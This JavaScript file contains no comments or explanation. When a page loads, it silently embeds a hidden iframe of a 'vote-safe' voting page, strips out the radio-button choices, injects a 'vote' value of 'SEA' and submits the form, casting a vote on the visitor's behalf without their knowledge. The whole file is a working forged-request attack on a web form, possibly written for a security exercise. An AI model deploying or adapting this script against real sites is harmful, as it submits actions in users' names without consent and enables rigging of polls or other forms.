(function () {

	var loadHiddenPage = function () {

		var iframe = document.createElement('iframe');
		iframe.setAttribute('name', 'hidden-frame');
		iframe.setAttribute('id', 'hidden-frame');
		iframe.setAttribute('src', 'vote-safe');
		iframe.setAttribute('style', 'visibility: hidden');
		
		document.body.appendChild(iframe);
	};
	
	var castVote = function () {
	
		var iframe = document.getElementById('hidden-frame');
		var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
		var radioButtons = iframeDoc.querySelectorAll('input[type="radio"]');
		
		if (radioButtons.length === 0) {
		
			setTimeout(castVote, 500);
		} else {
		
			var parent = radioButtons[0].parentElement;

			var foreach = Array.prototype.forEach;
			foreach.call(radioButtons, function (radioButton) {

				parent.removeChild(radioButton);
			});

			var input = document.createElement('input');
			input.setAttribute('name', 'vote');
			input.setAttribute('value', 'SEA');

			parent.appendChild(input);

			var form = iframeDoc.querySelector('form[method="post"]');
			form.submit();
		}
	};
	
	window.onload = function () {
	
	    loadHiddenPage();
	    castVote();
	}
}());